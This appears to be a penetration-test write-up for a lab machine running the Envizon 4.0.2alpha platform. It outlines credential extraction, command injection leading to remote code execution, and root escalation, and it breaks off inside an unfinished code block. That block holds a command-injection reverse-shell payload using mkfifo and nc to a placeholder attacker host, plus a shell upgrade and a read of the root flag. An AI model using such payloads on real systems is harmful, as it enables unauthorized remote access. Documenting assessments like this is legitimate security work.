# System-Penetration-Root-Escalation
An end-to-end security assessment detailing remote code execution (RCE) and privilege escalation on the Envizon machine.

## Executive Summary
An end-to-end security assessment was conducted on the **Envizon** target system, an instance running an open-source network visualization and penetration testing target-management platform (Version 4.0.2alpha). The objective was a white-box assessment to identify, chain, and exploit vulnerabilities leading to remote code execution (RCE) and full privilege escalation to root. 

The assessment successfully achieved a complete compromise of the application layer and host system. Major highlights include discovering hardcoded database credentials, exploiting a command injection vulnerability in a development feature, and leveraging weak file permissions to escalate privileges from a low-privileged system user to `root`.

---

## Scope & Methodology
* **Target System:** Envizon Web Application (Version 4.0.2alpha)
* **Testing Type:** White-box Assessment / Penetration Test
* **Methodology:** Aligned with the **PTES (Penetration Testing Execution Standard)** and **OWASP Top 10** frameworks.

### Attack Path Overview
1. **Information Gathering:** Database analysis and configuration file inspection.
2. **Initial Access:** Extracting active application credentials.
3. **Exploitation (RCE):** Leveraging input sanitization flaws within the development note/screenshot features to spawn a reverse shell.
4. **Privilege Escalation:** Exploiting system misconfigurations and local text artifacts to pivot to root access.

---

## Technical Breakdown & Exploitation

### 1. Information Gathering & Credential Extraction
As a white-box assessment of an actively used platform, the initial phase focused on analyzing the database structure and configuration files used by the application layer. 

* **Vulnerability Identified:** Insecure Storage of Sensitive Data / Weak Password Policy.
* **Analysis:** Querying the back-end SQLite database configuration mapped out user accounts and application flags. A weak or hardcoded credential set was successfully recovered from the application environment.

```bash
# Example query used to inspect the database schema and configurations
sqlite3 envizon.db "SELECT * FROM settings;"

# Payload injected into vulnerable note parameter to initiate callback
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ATTACKER_IP] [PORT] >/tmp/f

# Upgrading shell and grabbing the final root flag
python3 -c 'import pty; pty.spawn("/bin/bash")'
cat /root/root.txt

